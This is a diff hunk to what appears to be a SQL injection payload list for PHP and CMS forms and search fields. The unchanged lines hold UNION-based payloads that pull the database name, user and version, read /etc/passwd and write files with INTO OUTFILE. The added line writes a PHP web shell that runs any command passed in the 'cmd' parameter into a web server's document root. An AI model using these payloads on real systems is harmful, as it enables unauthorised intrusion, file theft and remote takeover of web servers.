@@ -286,6 +286,7 @@ SQL Injection - Forms/Search/PHP/CMS
 ' AND 1=2 UNION SELECT database(),user(),version() -- 
 ' AND 1=2 UNION SELECT "/etc/passwd","b","c"--'  
 ' UNION SELECT ("test") INTO OUTFILE 'C:/xampp/htdocs/test.php'  -- -'  
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
 
 
 =================================== 
